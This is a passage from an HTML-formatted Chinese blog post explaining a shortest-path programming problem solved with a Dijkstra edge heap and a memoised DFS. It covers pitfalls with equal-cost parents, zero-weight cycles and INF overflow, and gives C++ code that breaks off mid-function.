list</li>\n<li>然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。</li>\n</ul>\n<h2 id=\"需要注意的点\"><a href=\"#需要注意的点\" class=\"headerlink\" title=\"需要注意的点\"></a>需要注意的点</h2><h4 id=\"不可以这样寻找同代价的不同parent-节点\"><a href=\"#不可以这样寻找同代价的不同parent-节点\" class=\"headerlink\" title=\"不可以这样寻找同代价的不同parent 节点\"></a>不可以这样寻找同代价的不同parent 节点</h4><ul>\n<li><p>代码</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class=\"line\"><span class=\"comment\">// 其实edge t就代表了节点me</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Edge_t</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> me;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> t;</span><br><span class=\"line\">    Edge_t(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> h, <span class=\"keyword\">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Edge_t &amp;x) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> x.t &lt; <span class=\"keyword\">this</span>-&gt;t; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (!que.empty()) &#123;</span><br><span class=\"line\">    Edge_t t = que.top();</span><br><span class=\"line\">    que.pop();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me)</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可能某<code>Edge h</code> 确实跟pop出来的<code>Edge t</code>是代表的是同一个节点——也就是<code>h.me==t.me</code> ，并且代价相同。但是在堆中，还有同等代价的<code>Edge p</code>，其终点不是<code>t.me</code> ——也就是<code>p.me!=t.me</code> ，然后该<code>Edge p</code> 在堆中的位置处在<code>Edge h</code> 前面，所以上面那个while就没办法获得<code>Edge h</code> 从而无法获取完整的parent list。</p>\n</li>\n<li><p>另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出<code>Edge t</code> 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里</p>\n</li>\n</ul>\n<h4 id=\"考虑自循环边\"><a href=\"#考虑自循环边\" class=\"headerlink\" title=\"考虑自循环边\"></a>考虑自循环边</h4><ul>\n<li>直接判断要求某点A邻接的点不与A相同即可实现</li>\n</ul>\n<h4 id=\"因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\"><a href=\"#因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\" class=\"headerlink\" title=\"因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意\"></a>因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意</h4><ul>\n<li>dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法</li>\n</ul>\n<h4 id=\"INF的取值要注意\"><a href=\"#INF的取值要注意\" class=\"headerlink\" title=\"INF的取值要注意\"></a>INF的取值要注意</h4><ul>\n<li>dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得<code>INF+weight[i]</code>不再是INF</li>\n</ul>\n<h4 id=\"自己生成数据对拍时\"><a href=\"#自己生成数据对拍时\" class=\"headerlink\" title=\"自己生成数据对拍时\"></a>自己生成数据对拍时</h4><ul>\n<li>要注意不要生成多重边，网上很多ac的代码都是不支持多重边的</li>\n</ul>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cassert&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INF 0x3f3f3f3f</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; adj;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Node v[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> length[<span class=\"number\">600</span>][<span class=\"number\">600</span>]; <span class=\"comment\">// length[i][j]记录从node i到node j的length</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> TIME[<span class=\"number\">600</span>][<span class=\"number\">600</span>]; <span class=\"comment\">// TIME[i][j]记录从node i到node j的用时</span></span><br><span class=\"line\"><span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; tp[<span class=\"number\">600</span>];<span class=\"comment\">// node's parent list</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> tpResult[<span class=\"number\">600</span>];<span class=\"comment\">// 最终的node的parent</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> BEGIN, END; <span class=\"comment\">// 题目输入的天梯队员的起点和要到达的终点</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> vertexCnt, edgeCnt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dijstra</span><span class=\"params\">(<span class=\"keyword\">int</span> weight[][<span class=\"number\">600</span>])</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DFS</span><span class=\"params\">(<span class=\"keyword\">bool</span> isLength)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">outp</span><span class=\"params\">(<span class=\"keyword\">int</span> f, <span class=\"keyword\">int</span> index)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n, m;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;n, &amp;m)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                TIME[i][j] = INF;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++) &#123;</span><br><span class=\"line\">                length[i][j] = INF;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            v[i].index = i;</span><br><span class=\"line\">            v[i].adj.clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            tp[i].clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        vertexCnt = n, edgeCnt = m;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> v1, v2, one, l, t;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d%d%d\"</span>, &amp;v1, &amp;v2, &amp;one, &amp;l, &amp;t);</span><br><span class=\"line\">            v[v1].adj.push_back(v2);</span><br><span class=\"line\">            <span class=\"comment\">// 这样做是为了避免输入多重边——比如说从i到j有多条边，那么我们直接选最小代价的边即可</span></span><br><span class=\"line\">            length[v1][v2] = length[v1][v2] &lt; l ? length[v1][v2] : l;</span><br><span class=\"line\">            TIME[v1][v2] = TIME[v1][v2] &lt; t ? TIME[v1][v2] : t;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!one) &#123;</span><br><span class=\"line\">                v[v2].adj.push_back(v1);</span><br><span class=\"line\">                length[v2][v1] = length[v2][v1] &lt; l ? length[v2][v1] : l;</span><br><span class=\"line\">                TIME[v2][v1] = TIME[v2][v1] &lt; t ? TIME[v2][v1] : t;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;BEGIN, &amp;END);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (BEGIN == END) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"; Distance = \"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\"0\"</span></span><br><span class=\"line\">                 &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class=\"string\">\" =&gt; \"</span> &lt;&lt; END &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; TIME[BEGIN][END] &lt;&lt; <span class=\"string\">\"; Distance = \"</span> &lt;&lt; length[BEGIN][END] &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; BEGIN &lt;&lt; <span class=\"string\">\" =&gt; \"</span> &lt;&lt; END &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> timeEND = dijstra(TIME);</span><br><span class=\"line\"><span class=\"comment\">//        outp(END, 0);</span></span><br><span class=\"line\">        DFS(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; r1, r2;</span><br><span class=\"line\">        r1.push_back(END);</span><br><span class=\"line\">        <span class=\"comment\">// 以下这种构造路径的方式是建立在起点不同于终点的情况下</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> tmp_tp = tpResult[END];</span><br><span class=\"line\">        r1.push_back(tmp_tp);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class=\"line\">            tmp_tp = tpResult[tmp_tp];</span><br><span class=\"line\">            r1.push_back(tmp_tp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reverse(r1.begin(), r1.end());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++) &#123;</span><br><span class=\"line\">            tp[i].clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> lenEND = dijstra(length);</span><br><span class=\"line\"><span class=\"comment\">//        outp(END, 0);</span></span><br><span class=\"line\">        DFS(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        r2.push_back(END);</span><br><span class=\"line\">        tmp_tp = tpResult[END];</span><br><span class=\"line\">        r2.push_back(tmp_tp);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (tmp_tp != BEGIN) &#123;</span><br><span class=\"line\">            tmp_tp = tpResult[tmp_tp];</span><br><span class=\"line\">            r2.push_back(tmp_tp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        reverse(r2.begin(), r2.end());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">bool</span> isSame = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (r1.size() == r2.size()) &#123;</span><br><span class=\"line\">            isSame = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size(); i++) &#123;</span><br><span class=\"line\">                isSame = (r1[i] == r2[i]) &amp;&amp; isSame;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isSame) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; timeEND &lt;&lt; <span class=\"string\">\"; Distance = \"</span> &lt;&lt; lenEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r1[r1.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Time = \"</span> &lt;&lt; timeEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r1.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r1[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r1[r1.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Distance = \"</span> &lt;&lt; lenEND &lt;&lt; <span class=\"string\">\": \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; r2.size() - <span class=\"number\">1</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span> &lt;&lt; r2[i] &lt;&lt; <span class=\"string\">\" =&gt; \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span> &lt;&lt; r2[r2.size() - <span class=\"number\">1</span>] &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Edge_t</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> me;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> t;</span><br><span class=\"line\">    Edge_t(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> h, <span class=\"keyword\">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>&lt;(<span class=\"keyword\">const</span> Edge_t &amp;x) <span class=\"keyword\">const</span> &#123; <span class=\"keyword\">return</span> x.t &lt; <span class=\"keyword\">this</span>-&gt;t; &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// bfs+优先队列其实就是dijstra算法</span></span><br><span class=\"line\"><span class=\"comment\">// dijstra维护result set，源节点到这个set里的点的最短路径已经被找到</span></span><br><span class=\"line\"><span class=\"comment\">// 所以result set只会有node被加进去而不会有node被踢出去</span></span><br><span class=\"line\"><span class=\"comment\">// 不同于算法导论描述的dijstra算法——算导里的堆是点的堆，</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dijstra</span><span class=\"params\">(<span class=\"keyword\">int</span> weight[][<span class=\"number\">600</span>])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> resWei[<span class=\"number\">600</span>];</span><br><span class=\"line\">    priority_queue&lt;Edge_t&gt; que;</span><br><span class=\"line\">    que.push(Edge_t(BEGIN, <span class=\"number\">0</span>, <span class=\"number\">0</span>));<span class=\"comment\">// 后面用到了t.t+weight[t.me][adj[i]]，所以这里必须要取0</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> visit[vertexCnt];  <span class=\"comment\">// 记录某点是否已经加入到dijstra的result set里</span></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(visit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(visit) * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">bool</span>));</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (!que.empty()) &#123;</span><br><span class=\"line\">        Edge_t t = que.top();</span><br><span class=\"line\">        que.pop();</span><br><span class=\"line\">        <span class=\"comment\">// 因为这是Edge的堆，可能会有一些边pop出来时，其终点已经在result set里</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (visit[t.me]) &#123;</span><br><span class=\"line\">            assert(resWei[t.me] &lt;= t.t);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (resWei[t.me] == t.t) &#123;</span><br><span class=\"line\">                tp[t.me].push_back(t.p);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        visit[t.me] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        tp[t.me].push_back(t.p);</span><br><span class=\"line\">        resWei[t.me] = t.t;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;adj = v[t.me].adj;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> al = adj.size();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; al; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adj[i] == t.me)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            que.push(Edge_t(adj[i], t.me, t.t + weight[t.me][adj[i]]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resWei[END];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> dp[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> dpVisit[<span class=\"number\">600</span>];</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> f, <span class=\"keyword\">bool</span> isLength);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DFS</span><span class=\"params\">(<span class=\"keyword\">bool</span> isLength)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dp, <span class=\"number\">0xff</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(tpResult, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(tpResult));</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(dpVisit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(dpVisit));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> 